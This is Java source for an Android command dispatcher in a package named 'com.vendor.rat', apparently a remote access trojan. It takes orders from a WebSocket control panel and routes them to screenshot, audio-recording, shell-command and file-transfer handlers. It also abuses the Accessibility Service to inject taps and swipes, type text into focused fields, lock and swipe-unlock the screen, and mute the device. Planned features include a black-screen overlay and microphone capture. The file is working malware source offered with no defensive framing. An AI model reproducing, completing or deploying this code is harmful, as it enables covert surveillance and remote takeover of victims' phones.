package com.vendor.rat.control.handler;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Path;
import android.media.AudioManager;
import android.os.Bundle;
import android.util.Log;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import com.vendor.rat.MainApplication;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.network.WebSocketClient;
import com.vendor.rat.service.CommandHandler;
import com.vendor.rat.service.MyAccessibilityService;

/**
 * 指令分发器 (唯一的 WebSocket CommandListener)
 *
 * 路由逻辑:
 *   type="screencomd" → dispatchScreenCommand (Laravel PanelSendHandler 命令)
 *   type="engine"     → CommandHandler (引擎控制命令)
 *   type=数字         → 旧格式兼容 (本地 HttpCommandServer)
 */
public class CommandDispatcher implements WebSocketClient.CommandListener {

    private static final String TAG = "CommandDispatcher";

    private ScreenshotHandler screenshotHandler;
    private AudioRecordHandler audioRecordHandler;
    private ShellCommandHandler shellCommandHandler;
    private FileTransferHandler fileTransferHandler;
    private CommandHandler engineHandler;

    public CommandDispatcher() {
        screenshotHandler = new ScreenshotHandler();
        audioRecordHandler = new AudioRecordHandler();
        shellCommandHandler = new ShellCommandHandler();
        fileTransferHandler = new FileTransferHandler();
    }

    /**
     * 注册到 WebSocket 客户端 (唯一入口)
     */
    public void register() {
        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
        if (wsClient != null) {
            wsClient.setCommandListener(this);
        }
    }

    /**
     * 设置引擎命令处理器 (委托给 CommandHandler)
     */
    public void setEngineHandler(CommandHandler handler) {
        this.engineHandler = handler;
    }

    @Override
    public void onCommand(String type, String subc, JsonObject json) {
        try {
            // Laravel PanelSendHandler 下发: type="screencomd", subc="Screen/SMS/..."
            if ("screencomd".equals(type)) {
                dispatchScreenCommand(subc, json);
                return;
            }

            // Laravel PanelHandler 下发: type="screen", subc="nav/mov/paste/block/..."
            if ("screen".equals(type)) {
                dispatchScreenAction(subc, json);
                return;
            }

            // Laravel PanelHandler: type="mic", subc="ON/OFF"
            if ("mic".equals(type)) {
                Log.d(TAG, "mic command: subc=" + subc);
                // TODO: 麦克风录音模块
                return;
            }

            // 兼容旧数字 type 格式 (来自本地 HttpCommandServer)
            if (json.has("type") && json.get("type").isJsonPrimitive()) {
                try {
                    int numType = json.get("type").getAsInt();
                    switch (numType) {
                        case 10: screenshotHandler.handle(json); break;
                        case 11: audioRecordHandler.handle(json); break;
                        case 12: // fall through
                        case 13: fileTransferHandler.handle(json); break;
                        case 14: shellCommandHandler.handle(json); break;
                        default:
                            Log.w(TAG, "Unknown numeric command type: " + numType);
                    }
                    return;
                } catch (NumberFormatException ignored) {
                    // type is string, not number — fall through
                }
            }

            // 引擎控制命令 → 委托给 CommandHandler
            if ("engine".equals(type) || (json.has("cmd") && !json.get("cmd").getAsString().isEmpty())) {
                if (engineHandler != null) {
                    engineHandler.onCommand(type, subc, json);
                }
                return;
            }

            Log.w(TAG, "Unhandled command: type=" + type + ", subc=" + subc);
        } catch (Exception e) {
            Log.e(TAG, "Failed to dispatch command", e);
        }
    }

    /**
     * 分发 Laravel screencomd 命令
     * 对齐 PanelSendHandler 的 30+ 个命令
     */
    private void dispatchScreenCommand(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screencomd with null subc");
            return;
        }
        switch (subc) {
            case "Screen":      screenshotHandler.handle(payload); break;
            case "out":         screenshotHandler.handle(payload); break;
            // TODO: 其他命令在各模块实现后补充
            default:
                Log.d(TAG, "screencomd not yet handled: " + subc);
        }
    }

    /**
     * 分发 Laravel PanelHandler screen 操作命令
     * 对齐 PanelHandler.handleScreenCommand() 的 type="screen" 命令
     *
     * 格式: {"type":"screen", "subc":"nav/mov/paste/block/...", ...fields}
     */
    private void dispatchScreenAction(String subc, JsonObject payload) {
        if (subc == null) {
            Log.w(TAG, "screen action with null subc");
            return;
        }
        Log.d(TAG, "screen action: subc=" + subc);

        switch (subc) {
            case "nav":
                handleNav(payload);
                break;
            case "mov":
                handleMov(payload);
                break;
            case "snap":
                handleSnap(payload);
                break;
            case "paste":
                handlePaste(payload);
                break;
            case "block":
                Log.d(TAG, "block: " + payload.toString());
                // TODO: 黑屏遮罩 (需要 WindowManager overlay)
                break;
            case "vol":
                handleVolume(payload);
                break;
            case "kb":
                Log.d(TAG, "keyboard: " + payload.toString());
                // TODO: 键盘显示/隐藏控制
                break;
            case "L":
                handleLock(payload);
                break;
            case "Q":
                handleQuality(payload);
                break;
            case "out":
                screenshotHandler.handle(payload);
                break;
            default:
                Log.d(TAG, "screen action not yet handled: " + subc);
        }
    }

    /**
     * 导航: home / back / recent
     * 格式: {"type":"screen", "subc":"nav", "nav":"ho/bak/rec"}
     */
    private void handleNav(JsonObject payload) {
        String nav = payload.has("nav") ? payload.get("nav").getAsString() : "";
        Log.d(TAG, "nav: " + nav);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "nav: AccessibilityService not available");
            return;
        }

        int action;
        switch (nav) {
            case "ho":  action = AccessibilityService.GLOBAL_ACTION_HOME; break;
            case "bak": action = AccessibilityService.GLOBAL_ACTION_BACK; break;
            case "rec": action = AccessibilityService.GLOBAL_ACTION_RECENTS; break;
            default:
                Log.w(TAG, "nav: unknown nav=" + nav);
                return;
        }

        service.performGlobalAction(action);
    }

    /**
     * 触摸/滑动操作
     * movetype: "0"=点击, "1"=滑动, "2"=长按
     *
     * 点击/长按: poi = {"x":100,"y":200} (JSON 对象)
     * 滑动:     poi = "(x1,y1):(x2,y2)" (字符串)
     */
    private void handleMov(JsonObject payload) {
        String movetype = payload.has("movetype") ? payload.get("movetype").getAsString() : "";
        Log.d(TAG, "mov: movetype=" + movetype);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) {
            Log.w(TAG, "mov: AccessibilityService not available");
            return;
        }

        switch (movetype) {
            case "0": // 点击
                handleTap(service, payload);
                break;
            case "1": // 滑动
                handleSwipe(service, payload);
                break;
            case "2": // 长按
                handleLongPress(service, payload);
                break;
            default:
                Log.w(TAG, "mov: unknown movetype=" + movetype);
        }
    }

    private void handleTap(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "tap: x=" + coords[0] + ", y=" + coords[1]);
    }

    private void handleSwipe(AccessibilityService service, JsonObject payload) {
        // poi 格式: "(x1,y1):(x2,y2)" 或 "(x1,y1):(x2,y2):(x3,y3)"
        String poi = "";
        if (payload.has("poi")) {
            poi = payload.get("poi").isJsonPrimitive()
                ? payload.get("poi").getAsString()
                : payload.get("poi").toString();
        }

        // 解析 (x,y):(x,y) 格式
        String[] points = poi.split(":");
        if (points.length < 2) {
            Log.w(TAG, "swipe: invalid poi=" + poi);
            return;
        }

        int[] start = parsePoint(points[0]);
        int[] end = parsePoint(points[points.length - 1]);
        if (start == null || end == null) return;

        Path path = new Path();
        path.moveTo(start[0], start[1]);
        path.lineTo(end[0], end[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "swipe: " + start[0] + "," + start[1] + " → " + end[0] + "," + end[1]);
    }

    private void handleLongPress(AccessibilityService service, JsonObject payload) {
        int[] coords = parsePoiObject(payload);
        if (coords == null) return;

        Path path = new Path();
        path.moveTo(coords[0], coords[1]);

        GestureDescription gesture = new GestureDescription.Builder()
            .addStroke(new GestureDescription.StrokeDescription(path, 0, 1000))
            .build();

        service.dispatchGesture(gesture, null, null);
        Log.d(TAG, "longpress: x=" + coords[0] + ", y=" + coords[1]);
    }

    /**
     * 解析 poi JSON 对象 {"x":100,"y":200}
     */
    private int[] parsePoiObject(JsonObject payload) {
        try {
            if (payload.has("poi") && payload.get("poi").isJsonObject()) {
                JsonObject poi = payload.getAsJsonObject("poi");
                int x = poi.get("x").getAsInt();
                int y = poi.get("y").getAsInt();
                return new int[]{x, y};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoiObject failed", e);
        }
        return null;
    }

    /**
     * 解析 "(x,y)" 格式的坐标字符串
     */
    private int[] parsePoint(String point) {
        try {
            String clean = point.replaceAll("[()]", "").trim();
            String[] parts = clean.split(",");
            if (parts.length >= 2) {
                return new int[]{Integer.parseInt(parts[0].trim()), Integer.parseInt(parts[1].trim())};
            }
        } catch (Exception e) {
            Log.w(TAG, "parsePoint failed: " + point, e);
        }
        return null;
    }

    /**
     * 截图 (单次)
     * 格式: {"type":"screen", "subc":"snap", "snaptype":"1"}
     */
    private void handleSnap(JsonObject payload) {
        // 复用 screenshotHandler，构造 SM 命令
        JsonObject cmd = new JsonObject();
        cmd.addProperty("comdtype", "SM");
        screenshotHandler.handle(cmd);
    }

    /**
     * 粘贴文本到当前焦点
     * 格式: {"type":"screen", "subc":"paste", "txt":"hello"}
     */
    private void handlePaste(JsonObject payload) {
        String txt = payload.has("txt") ? payload.get("txt").getAsString() : "";
        Log.d(TAG, "paste: length=" + txt.length());

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null || txt.isEmpty()) return;

        // 设置剪贴板
        ClipboardManager clipboard = (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText("paste", txt));
        }

        // 通过无障碍服务粘贴到当前焦点节点
        android.view.accessibility.AccessibilityNodeInfo focus = service.findFocus(
            android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null) {
            Bundle args = new Bundle();
            args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, txt);
            focus.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            focus.recycle();
            Log.d(TAG, "paste: text set via ACTION_SET_TEXT");
        } else {
            Log.w(TAG, "paste: no input focus found, text copied to clipboard");
        }
    }

    /**
     * 音量控制
     * 格式: {"type":"screen", "subc":"vol", "volstate":"0"=静音/"1"=取消静音}
     */
    private void handleVolume(JsonObject payload) {
        String volstate = payload.has("volstate") ? payload.get("volstate").getAsString() : "0";
        Log.d(TAG, "volume: volstate=" + volstate);

        try {
            MainApplication app = MainApplication.getInstance();
            if (app == null || app.getApplication() == null) return;

            AudioManager am = (AudioManager) app.getApplication().getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;

            if ("0".equals(volstate)) {
                // 静音
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_MUTE, 0);
                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_MUTE, 0);
            } else {
                // 取消静音
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_UNMUTE, 0);
                am.adjustStreamVolume(AudioManager.STREAM_RING, AudioManager.ADJUST_UNMUTE, 0);
            }
        } catch (Exception e) {
            Log.w(TAG, "volume control failed", e);
        }
    }

    /**
     * 锁屏控制
     * 格式: {"type":"screen", "subc":"L", "lock":"0"=解锁/"1"=锁屏}
     */
    private void handleLock(JsonObject payload) {
        String lock = payload.has("lock") ? payload.get("lock").getAsString() : "0";
        Log.d(TAG, "lock: " + lock);

        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) return;

        if ("1".equals(lock)) {
            service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
        } else {
            // 解锁: 模拟上滑手势
            int w = service.getResources().getDisplayMetrics().widthPixels;
            int h = service.getResources().getDisplayMetrics().heightPixels;
            Path path = new Path();
            path.moveTo(w / 2f, h * 0.8f);
            path.lineTo(w / 2f, h * 0.2f);
            GestureDescription gesture = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
                .build();
            service.dispatchGesture(gesture, null, null);
        }
    }

    /**
     * 投屏画质调整
     * 格式: {"type":"screen", "subc":"Q", "newq":"30"}
     */
    private void handleQuality(JsonObject payload) {
        String newq = payload.has("newq") ? payload.get("newq").getAsString() : "";
        Log.d(TAG, "quality: " + newq);
        // TODO: 调整 ScreenshotHandler 的 JPEG_QUALITY 和 SCALE_FACTOR
    }
}
